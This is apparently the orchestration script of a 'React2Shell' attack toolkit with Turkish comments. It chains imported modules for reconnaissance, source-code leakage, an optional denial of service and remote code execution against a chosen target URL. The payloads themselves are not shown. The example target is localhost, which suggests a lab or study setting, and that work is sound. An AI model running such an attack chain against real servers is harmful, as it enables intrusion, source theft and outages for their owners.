#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
React2Shell — Faz 6: Tam Saldırı Zinciri Otomasyonu
Tüm fazları (Recon -> Source Leak -> DoS -> RCE) sıralı olarak çalıştırır.
"""

import sys
import argparse
from utils import (
    print_banner, check_target, info, success, warning, error,
    DEFAULT_HEADERS, Colors, timestamp
)

# Diğer scriptleri import et
try:
    import importlib.util
    def load_module(name, path):
        spec = importlib.util.spec_from_file_location(name, path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module
        
    recon = load_module("recon", "01_recon.py")
    source_leak = load_module("source_leak", "02_source_leak.py")
    dos = load_module("dos", "03_dos.py")
    rce = load_module("rce", "04_rce.py")
except Exception as e:
    error(f"Saldırı modülleri yüklenirken hata oluştu: {e}")
    sys.exit(1)

def parse_args():
    parser = argparse.ArgumentParser(description="React2Shell — Tam Saldırı Zinciri (Full Chain)")
    parser.add_argument("--target", "-t", required=True, help="Hedef URL (örn: http://localhost:3000)")
    parser.add_argument("--include-dos", action="store_true", help="DoS testini de dahil et (sunucuyu çökertebilir)")
    parser.add_argument("--phases", default="all", help="Çalıştırılacak fazlar (örn: recon,source,rce veya all)")
    return parser.parse_args()

def main():
    print_banner()
    args = parse_args()
    
    phases_to_run = [p.strip().lower() for p in args.phases.split(",")]
    run_all = "all" in phases_to_run
    
    info(f"Hedef: {Colors.BOLD}{args.target}{Colors.RESET}")
    info(f"Zaman: {timestamp()}")
    print("="*60 + "\n")
    
    # 0. Hedef Doğrulama
    health_data = check_target(args.target)
    if not health_data:
        error("Hedef ulaşılamaz, zincir başlatılamadı.")
        sys.exit(1)
        
    # Faz 1: Keşif
    if run_all or "recon" in phases_to_run:
        try:
            recon.run_recon(args.target)
        except Exception as e:
            error(f"Keşif aşamasında hata: {e}")
            
    # Faz 2: Kaynak Kod İfşası
    if run_all or "source" in phases_to_run:
        try:
            print("\n" + "·"*60 + "\n")
            source_leak.execute_source_leak(args.target)
        except Exception as e:
            error(f"Kaynak Kod İfşası aşamasında hata: {e}")
            
    # Faz 3: DoS (Opsiyonel)
    if (run_all and args.include_dos) or "dos" in phases_to_run:
        try:
            print("\n" + "·"*60 + "\n")
            dos.execute_dos(args.target)
        except Exception as e:
            error(f"DoS aşamasında hata: {e}")
    elif run_all and not args.include_dos:
        print("\n" + "·"*60 + "\n")
        warning("DoS testi atlandı. (Çalıştırmak için --include-dos ekleyin)")
        
    # Faz 4: RCE
    if run_all or "rce" in phases_to_run:
        try:
            print("\n" + "·"*60 + "\n")
            rce.execute_rce(args.target)
        except Exception as e:
            error(f"RCE aşamasında hata: {e}")
            
    print("\n" + "="*60)
    success("Tam Saldırı Zinciri tamamlandı!")
    info("Sonuçlar 'results/' klasörüne kaydedildi.")

if __name__ == "__main__":
    main()
